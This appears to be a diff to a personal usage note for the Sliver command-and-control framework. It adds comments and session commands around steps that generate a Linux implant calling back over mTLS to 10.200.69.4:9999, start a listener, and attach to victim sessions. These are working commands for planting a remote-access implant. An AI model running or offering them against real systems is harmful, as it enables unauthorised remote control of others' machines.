@@ -13,9 +13,13 @@ sudo systemctl start sliver
 # Usage
 
 ```bash
-# 
+# generate file to execute from target
 generate --mtls 10.200.69.4:9999 --os linux --arch amd64 --save /tmp/linux_implant
 
 # listener
 mtls --lhost 0.0.0.0 --lport 9999
+
+# session
+sessions
+use <session_ID>
 ```
